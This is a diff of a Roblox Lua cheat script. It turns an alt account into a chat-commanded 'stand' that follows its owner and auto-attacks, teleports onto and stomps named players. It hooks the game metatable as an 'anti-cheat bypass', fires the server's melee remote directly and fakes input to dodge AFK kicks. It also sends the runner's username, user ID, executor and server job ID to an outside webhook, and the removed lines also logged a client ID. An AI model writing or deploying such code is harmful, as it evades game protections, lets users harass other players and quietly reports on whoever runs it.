@@ -1,26 +1,23 @@
 --// =====================================================
---// CAPYSTAND + JUJUBOT v4 (SUPERFAST TRACK & KO)
+--// CAPYSTAND + JOJO ENGINE (ULTIMATE COMBINED VERSION)
+--// 10x Fast Tracking, Auto-Stomp, Webhooks & Optimizations
 --// =====================================================
 
+-- Ensure global settings exist
 getgenv().Settings = getgenv().Settings or {}
 
 local Settings = {
     Owner = getgenv().Settings.Owner or "OShisysj",
     Position = getgenv().Settings.Position or "Right",
     Attack = getgenv().Settings.Attack or "Light!",
-    Weapon = getgenv().Settings.Weapon or "Combat", -- "Combat" or "Knife"
+    Weapon = getgenv().Settings.Weapon or "Combat",
     FollowSpeed = getgenv().Settings.FollowSpeed or 30,
-    FloatHeight = getgenv().Settings.FloatHeight or 4,
+    FloatHeight = getgenv().Settings.FloatHeight or 2,
     Deadzone = getgenv().Settings.Deadzone or 0.15,
     FPSCAP = getgenv().Settings.FPSCAP or 60,
     LowGraphics = getgenv().Settings.LowGraphics or "Off",
     NoFace = getgenv().Settings.NoFace or "Off"
 }
-
-getgenv().ownershere = false
-getgenv().Masters1 = { 'punchy39' }
-getgenv().ownershere2 = false
-getgenv().Masters2 = { 'creamycunny' }
 
 -- Services
 local MarketplaceService = game:GetService("MarketplaceService")
@@ -30,56 +27,46 @@ local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
 local RunService = game:GetService("RunService")
 local VirtualUser = game:GetService("VirtualUser")
-local StarterGui = game:GetService("StarterGui")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local TextChatService = game:GetService("TextChatService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
 
-local LocalPlayer = Players.LocalPlayer
+local StandPlayer = Players.LocalPlayer
+local OwnerPlayer = nil
 
+-- State Control
+local following = false
+local attacking = false
+local charging = false
+
+print("Combined Stand loaded:", StandPlayer.Name)
+
+--==================================================
 -- EXECUTOR DETECTOR & WEBHOOK LOGGING
+--==================================================
 local executor = is_sirhurt_closure and "Sirhurt" 
     or (pebc_execute and "ProtoSmasher") 
     or (syn and "Synapse X") 
     or (secure_load and "Sentinel") 
     or (KRNL_LOADED and "Krnl/OxygenU") 
     or (getexecutorname and getexecutorname()) 
-    or (fluxus and fluxus.request and "Fluxus") 
     or "Unknown Executor"
 
 local placeInfo = { Name = "Unknown" }
-pcall(function()
-    placeInfo = MarketplaceService:GetProductInfo(game.PlaceId)
-end)
+pcall(function() placeInfo = MarketplaceService:GetProductInfo(game.PlaceId) end)
 
 local webhookData = {
-    username = "CapyStand / JujuBot",
+    username = "CapyStand x JoJo Engine",
     content = "To Join The User use the job id (" .. game.JobId .. ")",
-    embeds = {
-        {
-            author = {
-                name = "CapyStand Executed",
-                url = "https://www.roblox.com/groups/5756213/Gaming-Development-Studios#!/about",
-                icon_url = "https://thumbs.dreamstime.com/z/enso-zen-circle-brush-black-ink-vector-illustration-design-95961390.jpg",
-            },
-            title = "**Someone executed CapyStand + JujuBot**",
-            description = string.format(
-                "%s\nProfile: https://roblox.com/users/%d/profile\nUsername: **%s**\nDisplayName: **%s**\nUserID: **%d**\nExecutor: **%s**\nGameID: **%d**\nGameName: **%s**\nStandOwner: **%s**",
-                RbxAnalyticsService:GetClientId(),
-                LocalPlayer.UserId,
-                LocalPlayer.Name,
-                (LocalPlayer.DisplayName == LocalPlayer.Name and "N/A" or LocalPlayer.DisplayName),
-                LocalPlayer.UserId,
-                executor,
-                game.PlaceId,
-                placeInfo.Name or "Unknown",
-                tostring(Settings.Owner)
-            ),
-            type = "rich",
-            color = 7498202,
-            image = {
-                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png",
-            },
-        },
-    },
+    embeds = {{
+        title = "**Someone executed Combined Stand**",
+        description = string.format(
+            "Username: **%s**\nUserID: **%d**\nExecutor: **%s**\nGameID: **%d**\nGameName: **%s**\nStandOwner: **%s**",
+            StandPlayer.Name, StandPlayer.UserId, executor, game.PlaceId, placeInfo.Name, tostring(Settings.Owner)
+        ),
+        type = "rich", color = 7498202,
+    }},
 }
 
 local request = http_request or request or (syn and syn.request) or HttpPost
@@ -94,7 +81,9 @@ if request then
     end)
 end
 
--- ANTI-CHEAT BYPASS
+--==================================================
+-- ANTI-CHEAT BYPASS & UTILITIES
+--==================================================
 local grm = getrawmetatable(game)
 if grm then
     setreadonly(grm, false)
@@ -110,246 +99,311 @@ if grm then
 end
 
 -- Anti-AFK
-LocalPlayer.Idled:Connect(function()
+StandPlayer.Idled:Connect(function()
     VirtualUser:Button2Down(Vector2.new(0, 0), Workspace.CurrentCamera.CFrame)
     task.wait(1)
     VirtualUser:Button2Up(Vector2.new(0, 0), Workspace.CurrentCamera.CFrame)
 end)
 
--- Remove Seats
-for _, part in ipairs(Workspace:GetDescendants()) do
-    if part:IsA("Seat") then
-        part:Destroy()
+-- Low Graphics Option
+if Settings.LowGraphics == "On" then
+    Workspace.Terrain.WaterWaveSize = 0
+    Workspace.Terrain.WaterWaveSpeed = 0
+    game.Lighting.GlobalShadows = false
+    settings().Rendering.QualityLevel = "Level01"
+    for _, obj in ipairs(game:GetDescendants()) do
+        if obj:IsA("BasePart") then obj.Material = Enum.Material.Plastic end
     end
 end
 
--- STAND STATE CONTROL
-local summoned = false
-local following = false
-local targetKnockMode = false
-local currentTarget = nil
-local positionMode = Settings.Position
+-- FPS Cap
+_G.FPS = Settings.FPSCAP
+local lastFrame = tick()
+RunService.RenderStepped:Connect(function()
+    while lastFrame + (1 / _G.FPS) > tick() do end
+    lastFrame = tick()
+end)
 
-local chatConnection = nil
-local connectedOwner = nil
-
-local function getOwner()
-    return Players:FindFirstChild(Settings.Owner)
+--==================================================
+-- CHARACTER HELPERS
+--==================================================
+local function getHRP(player)
+    return player and player.Character and player.Character:FindFirstChild("HumanoidRootPart")
 end
 
-local function getRoot(character)
-    if not character then return nil end
-    return character:FindFirstChild("HumanoidRootPart")
+local function getHumanoid(player)
+    return player and player.Character and player.Character:FindFirstChildOfClass("Humanoid")
 end
 
 local function getOffset()
-    if positionMode == "Left" then
-        return Vector3.new(-5, Settings.FloatHeight, 0)
-    elseif positionMode == "Right" then
-        return Vector3.new(5, Settings.FloatHeight, 0)
-    elseif positionMode == "Back" then
-        return Vector3.new(0, Settings.FloatHeight, 6)
-    elseif positionMode == "Under" then
-        return Vector3.new(0, -4, 0)
+    if Settings.Position == "Left" then return Vector3.new(-4, Settings.FloatHeight, 0)
+    elseif Settings.Position == "Right" then return Vector3.new(4, Settings.FloatHeight, 0)
+    elseif Settings.Position == "Back" then return Vector3.new(0, Settings.FloatHeight, 4)
+    elseif Settings.Position == "Under" then return Vector3.new(0, -4, 0)
     end
-    return Vector3.new(5, Settings.FloatHeight, 0)
+    return Vector3.new(4, Settings.FloatHeight, 0)
 end
 
-local function getTargetPlayer(name)
-    name = name:lower()
+local function findPlayer(name)
+    name = tostring(name or ""):lower():gsub("%s+", "")
+    if name == "" then return nil end
     for _, player in ipairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer and (player.Name:lower():sub(1, #name) == name or player.DisplayName:lower():sub(1, #name) == name) then
+        if player.Name:lower():sub(1, #name) == name or player.DisplayName:lower():sub(1, #name) == name then
             return player
         end
     end
     return nil
 end
 
--- ACCURATE KO CHECK
-local function isTargetKnocked(target)
-    if not target or not target.Character then return true end
+local function findOwner()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Name:lower() == Settings.Owner:lower() then return player end
+    end
+    return nil
+end
+
+--==================================================
+-- WEAPON & ATTACK SYSTEM
+--==================================================
+local function equipTool()
+    local humanoid = getHumanoid(StandPlayer)
+    local char = StandPlayer.Character
+    local backpack = StandPlayer:FindFirstChildOfClass("Backpack")
     
-    local char = target.Character
-    local hum = char:FindFirstChildOfClass("Humanoid")
+    local weaponName = Settings.Weapon == "Knife" and "[Knife]" or "Combat"
+    local tool = (char and char:FindFirstChild(weaponName)) or (backpack and backpack:FindFirstChild(weaponName))
     
-    if hum and hum.Health <= 1 then return true end
-    
-    -- Check BodyEffects (Da Hood)
-    local bodyEffects = char:FindFirstChild("BodyEffects")
+    if tool and humanoid and tool.Parent ~= char then
+        humanoid:EquipTool(tool)
+        task.wait(0.05)
+    end
+    return tool
+end
+
+local function chargeAttack(holdTime)
+    local tool = equipTool()
+    if not tool then return false end
+    pcall(function()
+        VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 0)
+        task.wait(holdTime or 0.6)
+        VirtualInputManager:SendMouseButtonEvent(0, 0, 0, false, game, 0)
+    end)
+    return true
+end
+
+--==================================================
+-- ADVANCED KNOCK & KO DETECTION
+--==================================================
+local function isKnocked(character)
+    if not character then return true end
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if not humanoid or humanoid.Health <= 5 then return true end
+
+    local bodyEffects = character:FindFirstChild("BodyEffects")
     if bodyEffects then
         local ko = bodyEffects:FindFirstChild("K.O") or bodyEffects:FindFirstChild("KO")
-        if ko and ko.Value == true then
+        if ko and ko.Value == true then return true end
+    end
+
+    for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
+        local animName = track.Name:lower()
+        if animName:find("knock") or animName:find("ko") or animName:find("down") or animName:find("ragdoll") then
             return true
         end
     end
-    
-    -- Check for KO animations
-    if hum then
-        for _, track in ipairs(hum:GetPlayingAnimationTracks()) do
-            local animName = track.Name:lower()
-            if animName:find("knock") or animName:find("ko") or animName:find("down") or animName:find("ragdoll") then
-                return true
-            end
-        end
-    end
-
     return false
 end
 
--- ULTRA-FAST KNOCK TRACKING LOOP
-local function KnockTarget(targetName)
-    local target = getTargetPlayer(targetName)
-    if not target or not target.Character then
-        warn("JujuBot: Target player not found.")
+--==================================================
+-- FOLLOW SYSTEM (SMOOTH VELOCITY)
+--==================================================
+RunService.Heartbeat:Connect(function()
+    if not following or attacking then return end
+    if not OwnerPlayer or OwnerPlayer.Parent ~= Players then return end
+
+    local ownerHRP = getHRP(OwnerPlayer)
+    local standHRP = getHRP(StandPlayer)
+    if not ownerHRP or not standHRP then return end
+
+    local offset = getOffset()
+    local floatOffset = math.sin(time() * 3) * 0.6
+    
+    local targetPosition = (ownerHRP.CFrame * CFrame.new(offset.X, offset.Y + floatOffset, offset.Z)).Position
+    local distance = (targetPosition - standHRP.Position).Magnitude
+
+    if distance > 35 then
+        standHRP.CFrame = CFrame.new(targetPosition, targetPosition + ownerHRP.CFrame.LookVector)
+        standHRP.AssemblyLinearVelocity = Vector3.zero
         return
     end
 
-    currentTarget = target
-    targetKnockMode = true
-    following = false
+    local direction = targetPosition - standHRP.Position
+    standHRP.AssemblyLinearVelocity = direction * 12
+    standHRP.CFrame = CFrame.new(standHRP.Position, standHRP.Position + ownerHRP.CFrame.LookVector)
+end)
 
-    print("JujuBot: Hyper-Tracking -> " .. target.Name)
+--==================================================
+-- 10X FAST KNOCK ATTACK
+--==================================================
+local function knock(target)
+    if attacking or not target or target == StandPlayer then return end
+    attacking = true
+    charging = false
 
     task.spawn(function()
-        local mainEvent = ReplicatedStorage:FindFirstChild("MainEvent")
-        local startTime = tick()
-        
-        while targetKnockMode and currentTarget == target do
-            -- End when target is knocked or 15-second timeout hits
-            if isTargetKnocked(target) or (tick() - startTime > 15) then
-                print("JujuBot: Target knocked out! Retracting stand.")
-                break
-            end
+        local success, err = pcall(function()
+            local startTime = time()
+            local mainEvent = ReplicatedStorage:FindFirstChild("MainEvent")
 
-            local myChar = LocalPlayer.Character
-            local targetChar = target.Character
-            
-            if myChar and targetChar then
-                local myRoot = myChar:FindFirstChild("HumanoidRootPart")
-                local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
+            while following and target and target.Parent == Players and target.Character do
+                if time() - startTime >= 15 then break end
 
-                if myRoot and targetRoot then
-                    -- Position directly inside/behind the target
-                    myRoot.CFrame = targetRoot.CFrame * CFrame.new(0, 0, 1)
-                    myRoot.Velocity = Vector3.new(0, 0, 0) -- Strip falling/physics lag
+                local myHRP = getHRP(StandPlayer)
+                local enemyHRP = getHRP(target)
 
-                    -- Equipment selection
-                    local weaponName = Settings.Weapon == "Knife" and "[Knife]" or "Combat"
-                    local tool = myChar:FindFirstChild(weaponName) or LocalPlayer.Backpack:FindFirstChild(weaponName)
-                    
-                    if tool then
-                        tool.Parent = myChar
-                        tool:Activate()
-                    end
-
-                    -- Fire direct event packet to bypass client attack lag
-                    if mainEvent then
-                        mainEvent:FireServer("Melee", targetRoot.Position)
-                    end
+                if not myHRP or not enemyHRP or isKnocked(target.Character) then
+                    print("Target Knocked! Disengaging...")
+                    break
                 end
+
+                local distance = (myHRP.Position - enemyHRP.Position).Magnitude
+
+                if distance > 4 then
+                    local direction = enemyHRP.Position - myHRP.Position
+                    if direction.Magnitude > 0 then direction = direction.Unit end
+                    myHRP.AssemblyLinearVelocity = direction * 300
+                    myHRP.CFrame = CFrame.new(myHRP.Position, enemyHRP.Position)
+                else
+                    charging = true
+                    myHRP.CFrame = enemyHRP.CFrame * CFrame.new(0, 0, 1.2)
+                    myHRP.AssemblyLinearVelocity = Vector3.zero
+                    
+                    if mainEvent then mainEvent:FireServer("Melee", enemyHRP.Position) end
+                    chargeAttack(0.5)
+                    charging = false
+                end
+                task.wait()
             end
-
-            RunService.RenderStepped:Wait() -- Run every single render frame
+        end)
+        
+        local myHRP = getHRP(StandPlayer)
+        if myHRP then
+            myHRP.AssemblyLinearVelocity = Vector3.zero
+            myHRP.AssemblyAngularVelocity = Vector3.zero
         end
-
-        targetKnockMode = false
-        currentTarget = nil
-        if summoned then
-            following = true
-        end
+        attacking = false
     end)
 end
 
--- STAND FOLLOW RENDER LOOP
-RunService.RenderStepped:Connect(function(deltaTime)
-    if targetKnockMode or not summoned or not following then return end
+--==================================================
+-- STOMP / KO
+--==================================================
+local function stomp(target)
+    if not target then return end
+    local targetHRP = getHRP(target)
+    local standHRP = getHRP(StandPlayer)
+    if not targetHRP or not standHRP then return end
 
-    local owner = getOwner()
-    if not owner or not owner.Character then return end
+    attacking = true
+    pcall(function()
+        standHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 2)
+        task.wait(0.1)
+        for _ = 1, 6 do
+            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
+            task.wait(0.05)
+            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
+            task.wait(0.15)
+        end
+    end)
+    attacking = false
+end
 
-    local myCharacter = LocalPlayer.Character
-    if not myCharacter then return end
-
-    local myRoot = getRoot(myCharacter)
-    local ownerRoot = getRoot(owner.Character)
-    if not myRoot or not ownerRoot then return end
-
-    local targetPosition = (ownerRoot.CFrame * CFrame.new(getOffset())).Position
-    local distance = (targetPosition - myRoot.Position).Magnitude
-
-    if distance > Settings.Deadzone then
-        local alpha = 1 - math.exp(-Settings.FollowSpeed * deltaTime)
-        local newPosition = myRoot.Position:Lerp(targetPosition, alpha)
-
-        myRoot.CFrame = CFrame.lookAt(
-            newPosition,
-            newPosition + ownerRoot.CFrame.LookVector
-        )
-    end
-end)
-
+--==================================================
 -- COMMAND HANDLER
-local function handleCommand(message)
-    local args = string.split(message, " ")
-    local cmd = args[1]:lower()
+--==================================================
+local function stopStand()
+    following = false
+    attacking = false
+    charging = false
+    local hrp = getHRP(StandPlayer)
+    if hrp then
+        hrp.AssemblyLinearVelocity = Vector3.zero
+        hrp.AssemblyAngularVelocity = Vector3.zero
+    end
+    print("Stand stopped")
+end
 
-    if cmd == "summon!" then
-        targetKnockMode = false
-        summoned = true
-        following = true
-    elseif cmd == "stop!" then
-        summoned = false
-        following = false
-        targetKnockMode = false
-        currentTarget = nil
-    elseif cmd == "follow!" then
-        targetKnockMode = false
-        summoned = true
-        following = true
-    elseif cmd == "left!" then
-        positionMode = "Left"
-    elseif cmd == "right!" then
-        positionMode = "Right"
-    elseif cmd == "back!" then
-        positionMode = "Back"
-    elseif cmd == "under!" then
-        positionMode = "Under"
-    elseif cmd == "combat!" then
-        Settings.Weapon = "Combat"
-    elseif cmd == "knife!" then
-        Settings.Weapon = "Knife"
-    elseif (cmd == "knock!" or cmd == "knock") and args[2] then
-        KnockTarget(args[2])
+local function summon()
+    following = true
+    attacking = false
+    charging = false
+    local humanoid = getHumanoid(StandPlayer)
+    if humanoid then humanoid.AutoRotate = false end
+    print("Stand summoned")
+end
+
+local function onOwnerChatted(message)
+    if typeof(message) ~= "string" then return end
+    message = message:lower():gsub("!", "") -- Supports both "knock" and "knock!"
+    local split = message:split(" ")
+    local command = split[1]
+    if not command then return end
+    table.remove(split, 1)
+    local arguments = table.concat(split, " ")
+
+    if command == "summon" or command == "s" or command == "follow" then summon()
+    elseif command == "stop" or command == "x" then stopStand()
+    elseif command == "left" then Settings.Position = "Left"
+    elseif command == "right" then Settings.Position = "Right"
+    elseif command == "back" then Settings.Position = "Back"
+    elseif command == "under" then Settings.Position = "Under"
+    elseif command == "combat" then Settings.Weapon = "Combat"
+    elseif command == "knife" then Settings.Weapon = "Knife"
+    elseif command == "knock" or command == "k" then
+        local target = findPlayer(arguments)
+        if target then knock(target) else warn("Player not found") end
+    elseif command == "ko" or command == "stomp" then
+        local target = findPlayer(arguments)
+        if target then task.spawn(stomp, target) end
+    elseif message == "work now" then
+        local tcs = TextChatService:FindFirstChild("TextChannels")
+        if tcs then
+            for _, c in ipairs(tcs:GetChildren()) do
+                if c:IsA("TextChannel") then pcall(function() c:SendAsync("Yes master.") end) end
+            end
+        end
     end
 end
 
-local function connectOwner()
-    local owner = getOwner()
+--==================================================
+-- CONNECTIONS
+--==================================================
+local function connectOwner(owner)
     if not owner then return end
-    if connectedOwner == owner then return end
-
-    if chatConnection then chatConnection:Disconnect() end
-
-    connectedOwner = owner
-    chatConnection = owner.Chatted:Connect(handleCommand)
+    OwnerPlayer = owner
+    OwnerPlayer.Chatted:Connect(onOwnerChatted)
+    print("Owner connected:", OwnerPlayer.Name)
 end
 
-connectOwner()
+local initialOwner = findOwner()
+if initialOwner then connectOwner(initialOwner) end
 
 Players.PlayerAdded:Connect(function(player)
-    if player.Name == Settings.Owner then
-        task.wait(1)
-        connectOwner()
+    if player.Name:lower() == Settings.Owner:lower() then connectOwner(player) end
+end)
+
+Players.PlayerRemoving:Connect(function(player)
+    if player == OwnerPlayer then
+        stopStand()
+        OwnerPlayer = nil
     end
 end)
 
-LocalPlayer.CharacterAdded:Connect(function()
+StandPlayer.CharacterAdded:Connect(function()
+    stopStand()
     task.wait(1)
-    if summoned then following = true end
+    if OwnerPlayer then summon() end
 end)
 
-StarterGui:SetCore("SendNotification", {
-    Title = "CapyStand v4 Ready",
-    Text = "Max Speed Tracking Enabled!",
-    Duration = 5,
-})
+StarterGui:SetCore("SendNotification", {Title = "Combined Stand Loaded", Text = "Settings + JoJo Engine active!", Duration = 5})
+summon()
